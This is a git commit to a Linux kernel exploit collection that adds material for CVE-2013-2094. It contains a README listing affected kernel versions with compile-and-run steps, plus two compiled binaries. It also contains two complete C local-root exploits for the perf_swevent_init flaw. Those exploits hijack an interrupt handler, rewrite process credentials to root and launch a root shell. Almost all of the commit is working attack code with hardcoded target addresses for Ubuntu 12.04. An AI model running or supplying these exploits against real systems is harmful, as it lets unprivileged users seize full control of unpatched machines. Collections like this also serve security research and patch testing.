SecWiki__linux-kernel-exploits
commit 19c4485b5edf5a4047961095d1d6ae8e2c7fe0c7
Author:     Gitmaninc <gitman@foxmail.com>
AuthorDate: Sun May 14 10:05:34 2017 -0400
Commit:     Gitmaninc <gitman@foxmail.com>
CommitDate: Sun May 14 10:05:34 2017 -0400

    CVE-2013-2094

diff --git a/CVE-2013-2094/README.md b/CVE-2013-2094/README.md
new file mode 100644
index 0000000..0b27f5a
--- /dev/null
+++ b/CVE-2013-2094/README.md
@@ -0,0 +1,29 @@
+# CVE-2013-2094
+
+CVE-2013-2094
+
+Vulnerability reference:
+ * [CVE-2013-2094](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2013-2094)  
+
+## Kernels
+```
+3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4.0, 3.4.1, 3.4.2, 3.4.3, 3.4.4, 3.4.5, 3.4.6, 3.4.8, 3.4.9, 3.5, 3.6, 3.7, 3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9
+```   
+
+## Usage
+```
+$ gcc vnik.c -O2 -o vnik
+
+$ uname -r
+3.2.0-23-generic
+
+$ ./vnik 0
+```  
+### This binary has been verified on:
+ - Ubuntu 12.04.0 - Linux ubuntu 3.2.0-23-generic #36-Ubuntu x86_64  
+ - Ubuntu 12.04.1 - Linux ubuntu 3.2.0-29-generic #46-Ubuntu x86_64  
+ - Ubuntu 12.04.2 - Linux ubuntu 3.5.0-23-generic #35-Ubuntu x86_64   
+
+
+
+
diff --git a/CVE-2013-2094/perf_swevent b/CVE-2013-2094/perf_swevent
new file mode 100644
index 0000000..b805443
Binary files /dev/null and b/CVE-2013-2094/perf_swevent differ
diff --git a/CVE-2013-2094/perf_swevent.c b/CVE-2013-2094/perf_swevent.c
new file mode 100644
index 0000000..2451228
--- /dev/null
+++ b/CVE-2013-2094/perf_swevent.c
@@ -0,0 +1,282 @@
+/*
+ * CVE-2013-2094 exploit x86_64 Linux < 3.8.9
+ * by sorbo (sorbo@darkircop.org) June 2013
+ *
+ * Based on sd's exploit.  Supports more targets.
+ *
+ */
+
+#define _GNU_SOURCE
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <sys/syscall.h>
+#include <sys/mman.h>
+#include <linux/perf_event.h>
+#include <signal.h>
+#include <assert.h>
+
+#define BASE		0x380000000
+#define BASE_JUMP	0x1780000000
+#define SIZE  		0x10000000
+#define KSIZE		0x2000000
+
+#define TMP(x) (0xdeadbeef + (x))
+
+struct idt {
+	uint16_t limit;
+	uint64_t addr;
+} __attribute__((packed));
+
+static int _fd;
+
+static int perf_open(uint64_t off)
+{
+	struct perf_event_attr attr;
+	int rc;
+
+//	printf("perf open %lx [%d]\n", off, (int) off);
+
+	memset(&attr, 0, sizeof(attr));
+
+	attr.type   	    = PERF_TYPE_SOFTWARE;
+	attr.size   	    = sizeof(attr);
+	attr.config 	    = off;
+	attr.mmap   	    = 1;
+	attr.comm   	    = 1;
+	attr.exclude_kernel = 1;
+
+	rc = syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
+
+	return rc;
+}
+
+void __sc_start(void);
+void __sc_next(void);
+
+void __sc(void)
+{
+	asm("__sc_start:\n"
+	    "call __sc_next\n"
+	    "iretq\n"
+	    "__sc_next:\n");
+}
+
+void sc(void)
+{
+	int i, j;
+	uint8_t *current = *(uint8_t **)(((uint64_t) &i) & (-8192));
+	uint64_t kbase = ((uint64_t)current) >> 36;
+	int uid = TMP(1);
+	int gid = TMP(2);
+
+	for (i = 0; i < 4000; i += 4) {
+		uint64_t *p = (void *) &current[i];
+		uint32_t *cred = (uint32_t*) p[0];
+
+		if ((p[0] != p[1]) || ((p[0]>>36) != kbase))
+			continue;
+
+		for (j = 0; j < 20; j++) {
+			if (cred[j] == uid && cred[j + 1] == gid) {
+				for (i = 0; i < 8; i++) {
+					cred[j + i] = 0;
+					return;
+				}
+			}
+		}
+	}
+}
+
+static void sc_replace(uint8_t *sc, uint32_t needle, uint32_t val)
+{
+	void *p;
+
+	p = memmem(sc, 900, &needle, sizeof(needle));
+	if (!p)
+		errx(1, "can't find %x", needle);
+
+	memcpy(p, &val, sizeof(val));
+}
+
+static void *map_mem(uint64_t addr)
+{
+	void *p;
+
+	p = mmap((void*) addr, SIZE, PROT_READ | PROT_WRITE,
+		 MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
+
+	if (p == MAP_FAILED)
+		err(1, "mmap()");
+
+	return p;
+}
+
+static int find_mem(void *mem, uint8_t c)
+{
+	int i;
+	uint8_t *p = mem;
+
+	for (i = 0; i < SIZE; i++) {
+		if (p[i] == c)
+			return i;
+	}
+
+	return -1;
+}
+
+static void dropshell()
+{
+	if (setuid(0) != 0)
+		errx(1, "failed");
+
+	printf("Launching shell\n");
+
+	execl("/bin/sh", "sh", NULL);
+	exit(0);
+}
+
+void morte(int x)
+{
+	printf("Got signal\n");
+	close(_fd);
+	dropshell();
+}
+
+static void trigger(int intr)
+{
+	switch (intr) {
+	case 0:
+		do {
+			int z = 1;
+			int a = 1;
+
+			z--;
+
+			a /= z;
+		} while (0);
+		break;
+
+	case 4:
+		asm("int $4");
+		break;
+
+	case 0x80:
+		asm("int $0x80");
+		break;
+
+	default:
+		errx(1, "unknown intr %d", intr);
+	}
+
+	sleep(3);
+}
+
+int main(int argc, char *argv[])
+{
+	uint32_t *p[2];
+	int fd, i;
+	uint64_t off;
+	uint64_t addr = BASE;
+	struct idt idt;
+	uint8_t *kbase;
+	int sz = 4;
+	int intr = 4;
+
+	printf("Searchin...\n");
+
+	p[0] = map_mem(BASE);
+	p[1] = map_mem(BASE_JUMP);
+
+	memset(p[1], 0x69, SIZE);
+
+	off = 0xFFFFFFFFL;
+	fd = perf_open(off);
+	close(fd);
+
+	i = find_mem(p[0], 0xff);
+	if (i == -1) {
+		i = find_mem(p[1], 0x68);
+
+		if (i == -1)
+			errx(1, "Can't find overwrite");
+
+		sz = 24;
+		addr = BASE_JUMP;
+		printf("detected CONFIG_JUMP_LABEL\n");
+	}
+
+	munmap(p[0], SIZE);
+	munmap(p[1], SIZE);
+
+	addr += i;
+	addr -= off * sz;
+
+	printf("perf_swevent_enabled is at 0x%lx\n", addr);
+
+	asm("sidt %0" : "=m" (idt));
+
+	printf("IDT at 0x%lx\n", idt.addr);
+
+	off = addr - idt.addr;
+	off -= 8;
+
+	switch (off % sz) {
+	case 0:
+		intr = 0;
+		break;
+
+	case 8:
+		intr = 0x80;
+		break;
+
+	case 16:
+		intr = 4;
+		break;
+
+	default:
+		errx(1, "remainder %d", off % sz);
+	}
+
+	printf("Using interrupt %d\n", intr);
+
+	off -= 16 * intr;
+
+	assert((off % sz) == 0);
+
+	off /= sz;
+	off = -off;
+
+//	printf("Offset %lx\n", off);
+
+	kbase = (uint8_t*) (idt.addr & 0xFF000000);
+
+	printf("Shellcode at %p\n", kbase);
+
+	if (mmap(kbase, KSIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
+	     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED)
+		err(1, "mmap()");
+
+	memset(kbase, 0x90, KSIZE);
+	kbase += KSIZE - 1024;
+
+	i = __sc_next - __sc_start;
+	memcpy(kbase, __sc_start, i);
+	kbase += i;
+	memcpy(kbase, sc, 900);
+
+	sc_replace(kbase, TMP(1), getuid());
+	sc_replace(kbase, TMP(2), getgid());
+
+	signal(SIGALRM, morte);
+	alarm(2);
+
+	printf("Triggering sploit\n");
+	_fd = perf_open(off);
+
+	trigger(intr);
+
+	exit(0);
+}
diff --git a/CVE-2013-2094/perf_swevent64 b/CVE-2013-2094/perf_swevent64
new file mode 100644
index 0000000..de6785e
Binary files /dev/null and b/CVE-2013-2094/perf_swevent64 differ
diff --git a/CVE-2013-2094/perf_swevent64.c b/CVE-2013-2094/perf_swevent64.c
new file mode 100644
index 0000000..0d97243
--- /dev/null
+++ b/CVE-2013-2094/perf_swevent64.c
@@ -0,0 +1,133 @@
+/**
+ * Ubuntu 12.04 3.x x86_64 perf_swevent_init Local root exploit
+ * by Vitaly Nikolenko (vnik5287@gmail.com)
+ * 
+ * based on semtex.c by sd
+ *
+ * Supported targets:
+ * [0] Ubuntu 12.04.0 - 3.2.0-23-generic
+ * [1] Ubuntu 12.04.1 - 3.2.0-29-generic
+ * [2] Ubuntu 12.04.2 - 3.5.0-23-generic
+ *
+ * $ gcc vnik.c -O2 -o vnik
+ *
+ * $ uname -r
+ * 3.2.0-23-generic
+ *
+ * $ ./vnik 0
+ */
+ 
+#define _GNU_SOURCE 1
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <syscall.h>
+#include <stdint.h>
+#include <assert.h>
+ 
+#define BASE  0x1780000000
+#define SIZE  0x0010000000
+#define KSIZE 0x2000000
+#define AB(x) ((uint64_t)((0xababababLL<<32)^((uint64_t)((x)*313337))))
+ 
+typedef int __attribute__((regparm(3))) (*commit_creds_fn)(unsigned long cred);
+typedef unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(unsigned long cred);
+
+uint64_t targets[3][3] =
+            {{0xffffffff81ef67e0,  // perf_swevent_enabled
+              0xffffffff81091630,  // commit_creds
+              0xffffffff810918e0}, // prepare_kernel_cred
+             {0xffffffff81ef67a0,
+              0xffffffff81091220,
+              0xffffffff810914d0},
+             {0xffffffff81ef5940,
+              0xffffffff8107ee30,
+              0xffffffff8107f0c0}
+	    };
+
+void __attribute__((regparm(3))) payload() {
+	uint32_t *fixptr = (void*)AB(1);
+	// restore the handler
+	*fixptr = -1;
+	commit_creds_fn commit_creds = (commit_creds_fn)AB(2);
+	prepare_kernel_cred_fn prepare_kernel_cred = (prepare_kernel_cred_fn)AB(3);
+	commit_creds(prepare_kernel_cred((uint64_t)NULL));
+}
+ 
+void trigger(uint32_t off) {
+	uint64_t buf[10] = { 0x4800000001, off, 0, 0, 0, 0x300 };
+	int fd = syscall(298, buf, 0, -1, -1, 0);
+	assert( !close(fd) );
+}
+ 
+int main(int argc, char **argv) {
+	uint64_t off64, needle, kbase, *p;
+	uint8_t *code;
+	uint32_t int_n, j = 5, target = 1337;
+	int offset = 0;
+	void *map;
+
+	assert(argc == 2 && "target?");
+	assert( (target = atoi(argv[1])) < 3 );
+
+	struct {
+		uint16_t limit;
+		uint64_t addr;
+	} __attribute__((packed)) idt;
+
+	// mmap user-space block so we don't page fault
+	// on sw_perf_event_destroy
+	assert((map = mmap((void*)BASE, SIZE, 3, 0x32, 0,0)) == (void*)BASE);
+	memset(map, 0, SIZE);
+
+	asm volatile("sidt %0" : "=m" (idt));
+	kbase = idt.addr & 0xff000000;
+	printf("IDT addr = 0x%lx\n", idt.addr);
+
+	assert((code = (void*)mmap((void*)kbase, KSIZE, 7, 0x32, 0, 0)) == (void*)kbase);
+	memset(code, 0x90, KSIZE); code += KSIZE-1024; memcpy(code, &payload, 1024);
+	memcpy(code-13,"\x0f\x01\xf8\xe8\5\0\0\0\x0f\x01\xf8\x48\xcf", 13);
+
+	// can only play with interrupts 3, 4 and 0x80
+	for (int_n = 3; int_n <= 0x80; int_n++) {
+		for (off64 = 0x00000000ffffffff; (int)off64 < 0; off64--) {
+			int off32 = off64;
+	
+			if ((targets[target][0] + ((uint64_t)off32)*24) == (idt.addr + int_n*16 + 8)) {
+				offset = off32;
+				goto out;
+			}
+		}
+		if (int_n == 4) {
+			// shit, let's try 0x80 if the kernel is compiled with
+			// CONFIG_IA32_EMULATION
+			int_n = 0x80 - 1;
+		}
+	}
+out:
+	assert(offset);
+	printf("Using int = %d with offset = %d\n", int_n, offset);
+
+	for (j = 0; j < 3; j++) {
+		needle = AB(j+1);
+		assert(p = memmem(code, 1024, &needle, 8));
+		*p = !j ? (idt.addr + int_n * 16 + 8) : targets[target][j];
+	}
+	trigger(offset);
+	switch (int_n) {
+	case 3:
+		asm volatile("int $0x03");
+		break;
+	case 4:
+		asm volatile("int $0x04");
+		break;
+	case 0x80:
+		asm volatile("int $0x80");
+	}
+
+	assert(!setuid(0));
+	return execl("/bin/bash", "-sh", NULL);
+}
